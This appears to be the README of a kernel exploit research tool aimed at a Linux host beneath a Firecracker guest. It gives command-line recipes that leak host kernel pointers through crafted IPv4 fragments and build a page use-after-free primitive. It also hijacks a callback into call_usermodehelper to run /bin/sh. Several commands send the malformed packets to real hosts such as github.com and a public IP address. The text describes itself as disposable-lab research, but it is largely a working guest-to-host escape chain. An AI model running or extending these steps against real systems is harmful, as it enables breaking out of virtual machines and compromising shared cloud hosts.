Belajar networking

The original TAP/netns reproducer remains the default mode. To carry the same
checksum metadata across a Firecracker guest's real virtio-net boundary, run as
root inside the guest:

```sh
./test -egress -iface eth0 -dst chall.itsbengsky.id
```

Egress mode resolves the IPv4 route and next-hop MAC, sends the completing
fragments before the short malicious head, and listens for an ICMP quotation.
Its default UDP carrier is valid before the deferred write and exposes a second
UDP header after the IHL mutation, making a closed destination port return the
quoted leak through ordinary UDP/NAT paths. Use `-egress-transport raw253` for
the original experimental protocol carrier. When policy only admits web-like
traffic, `-egress-transport tcp -tcp-port 443` emits SYN-shaped TCP headers both
before and after the IHL mutation. Its default source-port bytes become
NOP,END IPv4 options after mutation. Its TCP checksum is intentionally invalid;
the controlled endpoint's passive AF_PACKET receiver observes fragments before
the remote TCP stack validates it. `-dst-mac`, `-gateway`, and `-src` can be used
when automatic discovery is unavailable.

For the x86 page-fragment layout, keep the TCP carrier at its default
`-vlan-tags 2`. Host TCP parsing pulls the remaining 12 bytes of the first TCP
header into the linear head; those two tags leave two bytes of tailroom after
that pull, exposing the `frag_list` pointer at reported past-linear offset 22.
The disposable TAP lab reproduced a canonical pointer with this geometry.

`-tcp-valid-checksum` makes both the original TCP segment and the segment that
appears after the 40-byte IHL shift checksum-valid. It solves the payload length
from the IPv4 TCP pseudo-header instead of modifying a scratch payload word;
the resulting valid segment still makes the deferred host checksum store
`0x4f00` into the first IPv4 word. This is useful when conntrack or egress policy
drops the default deliberately invalid TCP checksum. The flag is egress-only
and overrides `-egress-rest`.

```sh
./test -egress -egress-transport tcp -tcp-valid-checksum \
  -tcp-port 443 -vlan-tags 2 -dst 185.2.100.241
```

`-tcp-echo-options` is a bounded return-channel probe for an approved TCP
destination. It makes the original TCP header double as two valid IPv4 options
after the IHL rewrite: source port `0x8804` becomes a copied four-byte Stream-ID
option, and the TCP sequence becomes a 36-byte Timestamp option with no free
slot. A Linux TCP peer echoes the Timestamp option in its SYN-ACK or RST without
replacing the 32 bytes after its header. The capture path recognizes that reply,
prints the exact 32-byte window, and reports canonical pointer candidates.

The flag requires `-tcp-valid-checksum`. On the controlled Linux endpoint, a
raw SYN/SYN-ACK integration test returned all 32 marker bytes exactly; only the
Timestamp overflow nibble changed. A separate two-host public-route test got no
reply, so IPv4-option filtering by an Internet path remains a real limitation.
The probe is therefore most useful when an approved destination is terminated
or reflected by a host-local egress proxy. It does not bypass a destination
allowlist.

```sh
./test -egress -egress-transport tcp -tcp-valid-checksum \
  -tcp-echo-options -tcp-port 443 -vlan-tags 2 \
  -dst github.com -count 3 -egress-wait-ms 10000
```

Repeated egress samples are sent as one batch and share a single capture window:

```sh
./test -egress -count 100 -egress-wait-ms 10000
```

When external forwarding is unavailable, an unused address on the host-side TAP
can provide a return path. Route the crafted datagram through the TAP gateway and
add `-answer-dst-arp`; the probe answers the host's ARP request for `-dst`, then
captures host-fragmented packets returned to the guest. This mode is explicit
because it claims the destination address on that isolated link.

```sh
./test -egress -iface eth0 -dst 192.0.2.3 -gateway 192.0.2.1 \
  -answer-dst-arp -count 10 -egress-wait-ms 15000
```

To test whether the host immediately reuses a freed `skbuff_small_head` object
for the malicious short fragment, insert one or more 128-byte experimental
Ethernet frames directly before each head. Their payload is an obvious marker;
if the returned `past-linear` window contains repeated `ee` bytes, the leak is
showing controlled predecessor contents rather than unrelated allocator data:

```sh
./test -egress -iface eth0 -dst 192.0.2.3 -gateway 192.0.2.1 \
  -answer-dst-arp -egress-spray 1 -egress-spray-fill 0xee \
  -spray-delay-us 1000 -count 10 -egress-wait-ms 15000
```

The spray uses the locally administered experimental EtherType `0x88b5` and is
disabled unless `-egress-spray` is nonzero.

The prepared-TAP laboratory mode exposes the same experiment as
`-tebar 1 -tebar-fill 0xee`. Unlike the original same-sized predecessor, the
128-byte frame actually covers the 32-byte region disclosed past the short
head's logical tail. `-spray-delay-us` gives the receive backlog time to free
that predecessor before the malicious head is allocated.

`-vlan-tags` controls the number of nested VID-0 tags (default 2). On the
nonblocking TAP/page-fragment path used by Firecracker, five tags place the
raw/UDP carrier's logical IP tail two bytes before `skb_shared_info` on x86.
For TCP, the 12-byte transport-header pull shifts the equivalent useful layout
to two tags as described above. The disclosure then includes the live
`frag_list` pointer. The probe reports canonical little-endian kernel pointers
as `host-pointer-candidate` lines. The disposable Linux 6.18 lab verified tags
2 through 7; at Linux's `VLAN_MAX_DEPTH` of 8 the deferred checksum mutation
was no longer preserved.

For a controlled external endpoint, `cmd/receiver` passively records the same
mutated packets before the endpoint's IP stack handles them. It does not supply
checksum-offload metadata and therefore does not exercise this vulnerability on
the collector host:

```sh
go build -o receiver ./cmd/receiver
sudo ./receiver -iface eth0 -udp-port 9 -tcp-port 443
```

The local TAP/netns lab can also test other deferred mutations with
`-csum-offset` (any byte offset in the IPv4 header or first-fragment payload)
and `-csum-word` (the host-endian 16-bit value to write, except the unattainable
one's-complement value `0xffff`). The default `0/0x004f` remains the verified
IHL disclosure. The fragmenter subsequently replaces the total-length,
fragment-offset, and header-checksum bytes at offsets 2..3, 6..7, and 10..11;
the probe verifies any surviving byte of an overlapping unaligned write and
reports fully transient writes for kernel tracing or KASAN.

## Disposable stale-options callback lab

The `research-stale-options` branch contains a lab-only two-stage harness for
the stale parsed-options write. Eight held and explicitly drained 3456-byte TAP
frames seed a 32768-byte `task_frag` page. A safe `len=14` probe lets
`tools/skbtrace` report the recycled short child's `head`; writing that address
to `-stale-groom-head-file` releases a second `len=17` stage on the same locked
kernel thread.

For the Alpine 6.18.52 disposable VM, the second stage has been verified to:

1. set `SKBFL_ZEROCOPY_ENABLE` in the reclaimed child's `skb_shared_info`;
2. invoke a fake `ubuf_info->ops->complete` at the selected `strcpy` address;
3. copy a NUL-free fake `subprocess_info` over the `sk_buff` prefix;
4. force immediate skb rejection/free before the receive path reuses `skb->cb`;
5. execute `call_usermodehelper_exec_async(skb)` and create a harmless marker
   through `/bin/sh -c`.

Resolve all callback addresses from the current lab boot—KASLR makes addresses
copied from an earlier boot invalid:

```sh
awk '$3 == "strcpy" || $3 == "call_usermodehelper_exec_async" || \
     $3 == "legacy_pic_irq_pending_noop" { print $1, $3 }' /proc/kallsyms
```

Use those values with `-stale-groom-callback`,
`-stale-groom-umh-async`, and `-stale-groom-noop-ret`. The marker command is
selected with `-stale-groom-command`. This direct async-helper invocation runs
inside the TAP networking path and produces scheduling/RCU warnings in the
instrumented lab, even though the marker is created and the process exits.
It is not a completed Firecracker-host exploit: the real target still requires
host text addresses and the host-side recycled head address without relying on
guest BPF or `/proc/kallsyms`.

For an address-independent lab experiment, `-stale-groom-frag-page` seeds the
reclaimed short child with one valid `skb_frag_t` using an observed, aligned
`struct page` pointer.  With the current two-tag geometry and
`-stale-option-skip 6 -stale-option-len 19`, stale option processing reaches
exactly the first three `skb_shared_info` bytes: `flags`, `meta_len`, and
`nr_frags`.  Leave `destructor_arg` zero.  Although the first byte enables the
zerocopy flag, `skb_zcopy()` then returns NULL and normal fragment release sees
the forged `nr_frags=1`.  This mode is only for proving the unmatched page
reference decrement in the instrumented disposable kernel.  The natural
descriptor mode below removes that manual pointer input.

Use `-stale-groom-frag-page-file PATH` for the safer two-stage variant.  Its
length-14 probe pauses on the same locked kernel thread; write the tracer's
current `task_frag_page` value to `PATH`, and the length-19 stage seeds and
reclaims a child from that still-live page-fragment cache.

On Alpine's 6.18.52-0-virt kernel, the tracer observed the selected page at
refcount 4 when the forged child reached `kfree_skb`, then at refcount 0 on the
next same-thread event after the fragment SKBs were released.  The forged
shared-info bytes contained `flags=1`, `nr_frags=1`, a zero `destructor_arg`,
and the selected page in `frags[0]`.  This directly validates the extra page
unref and dangling `task_frag.page` primitive in the disposable lab.

`-stale-natural-frag` removes the supplied-pointer requirement.  It pads the
short middle fragment to 33,086 bytes and requests a 318-byte linear virtio
header.  The remaining 32,768 bytes become one genuine host `frags[0]` page.
Sixty-nine VLAN tags leave two bytes of linear tailroom in the 384-byte skb
head, and option length 7 changes exactly `flags`, `meta_len`, and `nr_frags`
to one.  Trimming the short IPv4 fragment releases its page while preserving
the descriptor bytes; the next ordinary TAP write immediately reclaims that
same order-3 page as `current->task_frag` before the stale slot is activated.
The disposable kernel trace showed the descriptor and task-fragment pointers
equal and the page refcount falling from 3 to 0.

`-stale-natural-overlap` continues that lab sequence after draining the output
packet-socket clones.  A second 33,086-byte fragment reclaims the freed order-3
page and remains live in another IPv4 reassembly queue.  Two ordinary untagged
completion frames then go through `tun_build_skb`; its dangling
`current->task_frag` pointer writes those frames into the live jumbo fragment's
nonlinear page.  The exact 6.18.52 lab trace showed both jumbo SKBs using
`frags[0].page=0xffffdb25c007a600`, and the captured second datagram changed at
payload offset 80 from its `0x72` fill to the exact controlled prefix
`02000000000102000000000208004500`:

```sh
./test -stale-options-write -stale-natural-frag \
  -stale-natural-overlap -capture-ms 500
```

`-stale-natural-anon` is a negative allocator experiment, kept to make the
remaining boundary reproducible.  It expires a configurable batch of
incomplete order-3 jumbo fragments, faults a populated anonymous mapping, then
looks for a marker written through the dangling `current->task_frag` cache:

```sh
./test -stale-options-write -stale-natural-frag \
  -stale-natural-anon -stale-anon-jumbos 96 \
  -stale-anon-wait-ms 32000 -stale-anon-size $((384 << 20))
```

On the exact Alpine 6.18.52 disposable kernel, both 64 MiB and 384 MiB runs
reported `marker_offset=-1`, including the 96-jumbo expiry attempt.  The freed
page remains an order-3 compound allocation on the high-order per-CPU page
list, while anonymous/KVM backing faults request order-0 pages.  This result
does not demonstrate reclaim as guest RAM or an EPT page-table page; a usable
chain still needs an explicit order-3-to-order-0 transition or a suitable
security-sensitive order-3 consumer.

The disposable lab also has a local-reassembly chain that turns the dangling
page into a clean order-3 reallocation and read primitive.  `scripts/setup.sh`
installs a destination-specific `notrack` rule for protocol 253 so the second
datagram reaches the IPv4 `LOCAL_DELIVER` reassembly queue, where
`skb_try_coalesce` is enabled.  The stale-options thread is pinned to one
allowed CPU so freeing and reclaiming use the same high-order per-CPU page
list.

```sh
./test -stale-options-write -stale-natural-frag \
  -stale-natural-overlap -stale-overlap-local-reassembly \
  -stale-local-rollover 10 -stale-local-single-ref \
  -stale-single-ref-anchors 8 -capture-ms 500
```

The single-reference variant holds a `kmalloc`-backed local reassembly in a
raw protocol-253 socket.  A 512-byte page-frag-backed bridge cannot fit in the
head's linear tailroom, so successful coalescing plants the dangling page as a
genuine `frags[0]`.  Eight incomplete jumbo anchors make the order-3 reclaim
robust.  Exhausting `current->task_frag` and closing the raw socket then frees
that page at refcount zero while one anchor retains a stale descriptor.  Eight
new jumbos reclaim it, and completing anchors identifies the stale one by
reading the new `0x80..0x87` fill through the old descriptor.

On the exact Alpine 6.18.52 disposable kernel, the tracer observed page
`0xffffe74640091200` in the original natural fragment, the first anchor, and
the coalesced descriptor (`nr_frags=1`, refcount 2).  After rollover moved the
task-fragment cache to another page, the first new jumbo received the same
`0xffffe74640091200`; anchor zero then disclosed its new `0x80` fill.  The
program exited successfully, all 29 Linux tests passed, and `dmesg` remained
empty through verification.

This mode intentionally leaves incomplete queues with stale descriptors and
is only for a disposable VM that is shut down before their fragment timers
expire.  It proves clean reallocation plus controlled read of a reused order-3
page, not host command execution.  The next step is to replace the known-fill
jumbo owner with a security-sensitive order-3 allocation and use the stale
anchor's later release or disclosure against that object.

The egress form briefly raises the guest interface MTU to 65535, sends the
jumbo descriptor seed followed by MTU-safe completing fragments, and restores
the original MTU on every return path:

```sh
./test -egress -stale-options-write -stale-natural-frag \
  -dst github.com -egress-rest 4000 -egress-wait-ms 100
```

Adding `-stale-natural-overlap` waits for the first datagram's host references
to drain, sends the live jumbo reclaim, and follows it with the two ordinary
frames that write through the dangling task-fragment cache.  The egress form
cannot observe the host payload directly, so the exact overlap assertion above
remains a disposable-lab check:

```sh
./test -egress -stale-options-write -stale-natural-frag \
  -stale-natural-overlap -dst github.com -egress-rest 4000 \
  -egress-wait-ms 100
```

This implements an address-independent host page-UAF primitive for the
Firecracker TAP boundary and verifies both deterministic reclaim and a
controlled overlap write into a still-live skb payload page in the disposable
kernel.  Hosted-target execution remains to be verified.  It is not by itself
host command execution: the overlap still needs conversion into corruption of
a security-sensitive host object or another control-flow primitive.
